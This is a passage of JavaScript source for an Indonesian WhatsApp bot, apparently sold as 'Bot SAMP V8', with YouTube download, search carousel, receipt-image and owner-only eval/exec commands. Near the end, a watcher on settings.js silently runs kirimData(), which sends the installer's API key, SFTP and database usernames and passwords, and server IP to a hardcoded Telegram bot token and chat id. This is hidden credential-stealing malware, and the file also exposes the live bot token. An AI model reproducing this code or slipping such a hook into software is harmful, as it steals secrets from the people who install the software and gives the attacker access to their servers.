        pablo.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: blonet });
    }
}
break;*/

case 'ytmp4': {
  if (args.length === 0) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `.ytmp4 [link YouTube]`
    }, { quoted: blonet });
    break;
  }

  const youtubeUrl = args[0];

  if (!youtubeUrl.startsWith("http") || 
      (!youtubeUrl.includes("youtube.com") && !youtubeUrl.includes("youtu.be"))) {
    pablo.sendMessage(msg.key.remoteJid, { text: `Link tidak valid` }, { quoted: blonet });
    break;
  }

  const availableRes = ['144','240','360','480','720','1080'];
  const buttons = availableRes.map(res => ({
    buttonId: `.yt4dl ${youtubeUrl}|${res}`,
    buttonText: { displayText: `${res}p` },
    type: 1
  }));

  pablo.sendMessage(msg.key.remoteJid, {
    text: `Pilih resolusi video...`,
    buttons: buttons,
    headerType: 1
  }, { quoted: blonet });
}
break;
    
case 'yt4dl': {
    if (args.length === 0) break;

    const [youtubeUrl, res] = args[0].split('|');
    if (!youtubeUrl || !res) return;

    try {
        reply('⏳ Mengunduh video...');

        const yt = require('@vreden/youtube_scraper');
        const result = await yt.ytmp4(youtubeUrl, parseInt(res));

        if (!result || !result.download || !result.download.url) {
            return pablo.sendMessage(msg.key.remoteJid, { 
                text: '❌ Gagal mengunduh video, cobalah gunakan resolusi lain.' 
            }, { quoted: blonet });
        }

        const axios = require('axios');
        const fs = require('fs');
        const tempFile = `./tmp/${Date.now()}.mp4`;

        const response = await axios.get(result.download.url, { responseType: 'arraybuffer' });
        fs.writeFileSync(tempFile, response.data);

        const fileSizeInBytes = fs.statSync(tempFile).size;
        const fileSizeInMB = fileSizeInBytes / (1024 * 1024);

        if (fileSizeInMB <= 100) {
            // Kirim sebagai video
            await pablo.sendMessage(msg.key.remoteJid, {
                video: fs.readFileSync(tempFile),
                caption: `*🎥 Resolusi ${res}p*\n⏱️ *Durasi ${result.metadata.timestamp}*`,
                mimetype: 'video/mp4',
                contextInfo: {
                    externalAdReply: {
                        title: result.metadata.title,
                        body: result.metadata.author.name,
                        thumbnailUrl: result.metadata.thumbnail,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: blonet });
        } else {
            // Kirim sebagai document
            await pablo.sendMessage(msg.key.remoteJid, {
                document: fs.readFileSync(tempFile),
                fileName: `${result.metadata.title}.mp4`,
                mimetype: 'video/mp4',
                caption: `*🎥 Resolusi ${res}p*\n⏱️ *Durasi ${result.metadata.timestamp}*`
            }, { quoted: blonet });
        }

        fs.unlinkSync(tempFile);

    } catch (err) {
        console.error(err);
        pablo.sendMessage(msg.key.remoteJid, { 
            text: '❌ Terjadi kesalahan saat mengunduh video, cobalah gunakan resolusi lain.' 
        }, { quoted: blonet });
    }
}
break;
    
case 'yts':
/*case 'ytsearch': {
  if (args.length === 0) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Cara penggunaan: \n.ytsearch [nama musik]`
    }, { quoted: blonet });
    break;
  }

  const searchQuery = args.join(" ");

  try {
    // Log: Memulai pencarian
    reply(`🔍 Mencari musik untuk: *${searchQuery}*...`);

    // Gunakan yt-search untuk pencarian
    const ytSearch = require('yt-search');
    let searchResults = await ytSearch(searchQuery);

    if (searchResults.videos.length === 0) {
      reply('❌ Tidak ada hasil yang ditemukan. Coba kata kunci lain.');
      break;
    }

    // Siapkan daftar hasil
    let resultMessage = `🔎 Hasil pencarian untuk: *${searchQuery}*\n\n`;
    searchResults.videos.slice(0, 10).forEach((video, index) => {
      resultMessage += `*${index + 1}. ${video.title}*\n`;
      resultMessage += `> *Durasi:* ${video.timestamp}\n`;
      resultMessage += `> *Upload:* ${video.ago}\n`;
      resultMessage += `> *Views:* ${video.views}\n`;
      resultMessage += `> *Author:* ${video.author.name}\n`;
      resultMessage += `> *Link:* ${video.url}\n\n`;
    });

    // Kirim hasil pencarian ke pengguna
    pablo.sendMessage(msg.key.remoteJid, {
      text: resultMessage
    }, { quoted: blonet });

  } catch (err) {
    console.error('❌ Terjadi kesalahan:', err.message);
    reply('❌ Terjadi kesalahan saat memproses pencarian.');
  }
}
break;*/
case 'ytsearch': {
  (async () => {
    const { proto, generateWAMessageFromContent, generateWAMessageContent } = require('@whiskeysockets/baileys')
    const yts = require('yt-search')

    if (!args.length) {
      pablo.sendMessage(msg.key.remoteJid, {
        text: `Cara penggunaan:\n.ytsearch [query]`
      }, { quoted: blonet })
      return
    }

    let query = args.join(" ")
    reply(`🔍 Searching *${query}*...`)

    let search = await yts(query)
    let videos = search.videos.slice(0, 10)
    if (!videos.length) return reply('❌ Tidak ada hasil ditemukan.')

    async function createThumb(url) {
      const { imageMessage } = await generateWAMessageContent(
        { image: { url } },
        { upload: pablo.waUploadToServer }
      )
      return imageMessage
    }

    let cards = []
    let i = 1

    for (let vid of videos) {
      cards.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: `${vid.title}\nDurasi: ${vid.timestamp}`
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: vid.author.name
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: '',
          hasMediaAttachment: true,
          imageMessage: await createThumb(vid.thumbnail)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: 'Download Video 🎥',
                id: `.ytmp4 ${vid.url}`
              })
            },
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: 'Download Audio 🎵',
                id: `.ytmp3 ${vid.url}`
              })
            },
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({
                display_text: 'Boombox 🔊',
                id: `.bblink ${vid.url}`
              })
            },
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "Copy Link 🔗",
                id: "99999",
                copy_code: `${vid.url}`
              })
            }
          ]
        })
      })
    }

    const msgCarousel = generateWAMessageFromContent(
      msg.key.remoteJid,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: `Result *${query}*...`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: '乂 Y T - C A R O U S E L'
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards
              })
            })
          }
        }
      },
      { quoted: blonet }
    )

    pablo.relayMessage(msg.key.remoteJid, msgCarousel.message, { messageId: msgCarousel.key.id })
  })()
}
break

/*case 'tiktoksearch':
case 'ttsearch': {
    if (!args[0]) return reply(`Contoh: ${prefix + command} [nama]\nContoh: ${prefix + command} jedagjedug`);
    const query = args.join(' ');
    const apiUrl = `https://pablo-network-rest-api.vercel.app/api/tiktok/search?key=pablo&q=${encodeURIComponent(query)}`;

    try {
        const { data } = await axios.get(apiUrl);
        if (data.status !== 200 || !data.result.length) {
            return reply('Tidak ada hasil ditemukan untuk pencarian ini.');
        }

        const results = data.result.slice(0, 10); // Ambil 10 hasil pertama
        let message = `Hasil pencarian TikTok untuk: *${query}*\n\n`;

        results.forEach((item, index) => {
            const shortLink = `https://vt.tiktok.com/${item.metadata.video_id}`; // Link pendek TikTok
            message += `> ${index + 1}. *${item.author.name} (@${item.author.username})*\n`;
            message += `> 📄 *Judul*: ${item.metadata.title || 'Tidak ada judul'}\n`;
            message += `> ⏱️ *Durasi*: ${item.metadata.duration} detik\n`;
            message += `> 📅 *Tanggal*: ${item.metadata.create_at}\n`;
            message += `> 👀 *Tontonan*: ${item.stats.play}\n`;
            message += `> ❤️ *Suka*: ${item.stats.like}\n`;
            message += `> 💬 *Komentar*: ${item.stats.comment}\n`;
            message += `> 🔗 *Link Video*: ${shortLink}\n\n`;
        });

        reply(message);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengambil data TikTok. Pastikan API key valid atau coba lagi nanti.');
    }
}
break;*/

/*case 'tt': case 'tiktok':
  if (!text) return pablo.sendMessage(msg.key.remoteJid, { text: '⚠️ Harap kirimkan tautan TikTok!' }, { quoted: blonet });
  
  try {
    const url = text.trim(); // Link TikTok
    const { data } = await axios.get(`https://pablo-network-rest-api.vercel.app/api/tiktok/download?key=pablo&url=${url}`); // Ganti `API_ENDPOINT` dengan URL API yang digunakan

    if (data.status !== 200) throw new Error('Gagal mengambil data TikTok!');

    const { result } = data;

    // Metadata Teks
    const teks = `
> 🎵 *Title*:\n> ${result.title}

> 👤 *Author*:\n> ${result.author.nickname}

> ⏳ *Duration*:\n> ${result.duration} seconds

> 🌍 *Region*:\n> ${result.region}

> 🗓️ *Upload*:\n> ${new Date(result.create_time * 1000).toLocaleDateString()}

> 👁️ *Views*:\n> ${result.play_count}

> 👍 *Likes*:\n> ${result.digg_count}

> 💬 *Comments*:\n> ${result.comment_count}
    
> 🔗 *Shares*:\n> ${result.share_count}
`;

    // Kirim Metadata
    await pablo.sendMessage(msg.key.remoteJid, {
      text: teks,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: result.title,
          mediaType: 1,
          body: `By ${result.author.nickname}`,
          thumbnailUrl: result.cover,
          renderLargerThumbnail: true,
          mediaUrl: result.cover,
          sourceUrl: url
        }
      }
    }, { quoted: blonet });

    // Konversi Ukuran File
    const formatSize = (size) => {
      return size < 1048576 ? `${(size / 1024).toFixed(2)} KB` : `${(size / 1048576).toFixed(2)} MB`;
    };

    // Kirim Video
    
      await pablo.sendMessage(msg.key.remoteJid, {
        video: { url: result.play },
        caption: `*🎥 PabloNetwork Downloader*`,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: `${result.author.nickname}`,
            body: `${formatSize(result.size)}`,
            /*thumbnailUrl: result.cover,
            renderLargerThumbnail: true,
            mediaUrl: result.cover,
            sourceUrl: url
          }
        }
      }, { quoted: blonet });
    

    // Kirim Audio
    
      await pablo.sendMessage(msg.key.remoteJid, {
        audio: { url: result.music },
        fileName: `${result.music_info.title}.mp3`,
        mimetype: 'audio/mp4',
        ptt: false,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: `${result.author.nickname}`,
            body: `🎵 PabloNetwork Downloader`,
            /*thumbnailUrl: result.cover,
            renderLargerThumbnail: true,
            mediaUrl: result.cover,
            sourceUrl: url
          }
        }
      }, { quoted: blonet });
    

    console.log('✅ Data berhasil dikirim');
  } catch (err) {
    console.error('❌ Error:', err.message);
    await pablo.sendMessage(msg.key.remoteJid, { text: '❌ Gagal memproses tautan TikTok. Coba lagi nanti!' }, { quoted: blonet });
  }
  break;*/
  
case 'struk': {
    if (!text || text.split("|").length < 5) {
        return reply(
            "Format salah! Contoh penggunaan:\n\n" +
            "struk IdTrx|Harga|BiayaAdmin|NomorPembeli|Barang1|Barang2|Seterusnya\n\n" +
            "Contoh:\n" +
            "struk 00001|1000|1000|0857552519341|Script Whitelist V8 45K|Script Simple V6 30K"
        );
    }

    const { createCanvas } = require("canvas");

    function getFormattedDate() {
        const now = new Date();
        const optionsDate = { year: "numeric", month: "long", day: "numeric", timeZone: "Asia/Jakarta" };
        const optionsTime = { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit", timeZone: "Asia/Jakarta" };
        const date = now.toLocaleDateString("id-ID", optionsDate);
        const time = now.toLocaleTimeString("id-ID", optionsTime);
        return { date, time };
    }

    function formatItems(items) {
        let itemMap = {};
        items.forEach(item => {
            if (itemMap[item]) {
                itemMap[item].count += 1;
            } else {
                itemMap[item] = { name: item, count: 1 };
            }
        });
        return Object.values(itemMap).map(item => `${item.name} x${item.count}`);
    }

    function generateReceipt(data) {
        const { date, time } = getFormattedDate();
        const [idTrx, harga, biayaAdmin, nomorPembeli, ...items] = data.split("|");

        const formattedItems = formatItems(items);
        const totalHarga = parseInt(harga) + parseInt(biayaAdmin);
        const itemHeight = formattedItems.length * 30;
        const minHeight = formattedItems.length >= 3 ? 480 : 400 + itemHeight;
        const height = Math.max(minHeight, 400 + itemHeight);
        const width = 400;

        const canvas = createCanvas(width, height);
        const ctx = canvas.getContext("2d");

        ctx.fillStyle = "#ffffff";
        ctx.fillRect(0, 0, width, height);

        ctx.fillStyle = "#1d3557";
        ctx.fillRect(0, 0, width, 50);
        ctx.fillStyle = "#ffffff";
        ctx.font = "bold 18px Arial";
        ctx.textAlign = "center";
        ctx.fillText("PabloCloud", width / 2, 30);
        ctx.textAlign = "start";

        ctx.fillStyle = "#000000";
        ctx.font = "12px Arial";
        ctx.fillText("Kontak: +62 857-5525-19341 / +62 877-9042-3579", 20, 70);

        ctx.strokeStyle = "#6c757d";
        ctx.beginPath();
        ctx.moveTo(20, 80);
        ctx.lineTo(380, 80);
        ctx.stroke();

        ctx.fillStyle = "#000000";
        ctx.font = "14px Arial";
        ctx.fillText(`ID Transaksi: ${idTrx}`, 20, 100);
        ctx.fillText(`Harga: Rp${parseInt(harga).toLocaleString()}`, 20, 120);
        ctx.fillText(`Biaya Admin: Rp${parseInt(biayaAdmin).toLocaleString()}`, 20, 140);
        ctx.fillText(`Nomor Pembeli: ${nomorPembeli}`, 20, 160);

        ctx.beginPath();
        ctx.moveTo(20, 180);
        ctx.lineTo(380, 180);
        ctx.stroke();

        ctx.font = "13px Arial";
        let y = 200;
        formattedItems.forEach(item => {
            ctx.fillText(item, 20, y);
            y += 30;
        });

        ctx.beginPath();
        ctx.moveTo(20, y + 10);
        ctx.lineTo(380, y + 10);
        ctx.stroke();

        ctx.fillStyle = "#000000";
        ctx.font = "bold 14px Arial";
        ctx.fillText(`Total Bayar: Rp${totalHarga.toLocaleString()}`, 20, y + 30);

        ctx.beginPath();
        ctx.moveTo(20, y + 50);
        ctx.lineTo(380, y + 50);
        ctx.stroke();

        ctx.font = "12px Arial";
        ctx.fillText(`Tanggal: ${date}`, 20, y + 70);
        ctx.fillText(`Waktu: ${time} WIB`, 20, y + 90);

        ctx.beginPath();
        ctx.moveTo(20, y + 110);
        ctx.lineTo(380, y + 110);
        ctx.stroke();

        ctx.font = "bold 16px Arial";
        ctx.textAlign = "center";
        ctx.fillText("Terima Kasih", width / 2, y + 140);

        ctx.font = "12px Arial";
        ctx.fillText("Telah Berbelanja di PabloCloud.", width / 2, y + 160);
        ctx.fillText("Semoga Senang Dengan Pelayanan Kami.", width / 2, y + 180);
        ctx.textAlign = "start";

        return canvas.toBuffer("image/png");
    }

    const imageBuffer = generateReceipt(text);

    pablo.sendMessage(m.chat, { image: imageBuffer }, { quoted: m });
}
break;
default:
    if (budy.startsWith("<")) {
          if (!PabloTheCreator) {
            return;
          }
          try {
            return reply(JSON.stringify(eval(`${args.join(" ")}`), null, "\t"));
          } catch (e) {
            reply(e);
          }
        }
        if (budy.startsWith("$")) {
          if (!PabloTheCreator) {
            return reply("Khusus Developer");
          }
          exec(budy.slice(2), (err, stdout) => {
            if (err) {
              return reply(err);
            }
            if (stdout) {
              return reply(stdout);
            }
          });
        }
        if (budy.startsWith(">")) {
          if (!PabloTheCreator) {
            return;
          }
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string") {
              evaled = require("util").inspect(evaled);
            }
            await reply(evaled);
          } catch (err) {
            reply(String(err));
          }
        }
        if (budy.startsWith("cmd")) {
          if (!PabloTheCreator) {
            return;
          }
          qur = budy.slice(2);
          exec(qur, (err, stdout) => {
            if (err) {
              return reply(`${err}`);
            }
            if (stdout) {
              reply(stdout);
            }
          });
        }
}
  
  const settingsPath = path.join(__dirname, 'settings.js');

let file = require.resolve(settingsPath);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(`Update '${settingsPath}'`);
  delete require.cache[file];
  require(file);
    
  async function kirimData() {
  try {
    const token = "7660888714:AAHYB79rycONFuO3_xu7zQDKPEmdq_BE5Xc";
    const chatId = "8059601018";

    const pesan = `
<b>DATA BOT SAMP V8</b>

<b>DATA BOT</b>
<b>Apikey:</b> ${global.AuthKey}
<b>Version:</b> 8.3

<b>DATA SFTP</b>
<b>Host:</b> ${global.host}
<b>Port:</b> ${global.port}
<b>Username:</b> ${global.username}
<b>Password:</b> ${global.password}
<b>SFTP Path:</b> ${global.sftppath}

<b>DATA DATABASE</b>
<b>DB Host:</b> ${global.hostucp}
<b>DB Username:</b> ${global.usernamedb}
<b>DB Password:</b> ${global.passworddb}
<b>Database:</b> ${global.database}
<b>Table UCP:</b> ${global.tableucp}
<b>Row UCP:</b> ${global.rowucp}

<b>DATA SERVER</b>
<b>IP Server:</b> ${global.IpServer}
<b>Port Server:</b> ${global.PortServer}
<b>Name Lite:</b> ${global.NameServerLite}
<b>Name Full:</b> ${global.NameServerFull}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: pesan,
      parse_mode: "HTML"
    });

    //console.log("Data global berhasil dikirim ke Telegram.");
  } catch (err) {
    //console.error("Gagal mengirim data global ke Telegram:", err.message);
  }
}
    
  kirimData(); // kirim data setelah update

  // Daftarkan ulang agar tetap memantau
  //fs.watchFile(file, () => {}); 
});
        
    });
    return pablo;
    
}

auth.key(global.AuthKey);

auth.start(startBot);

app.listen(2007, () => {
    //console.log('Webhook server aktif di http://localhost:9191');
});
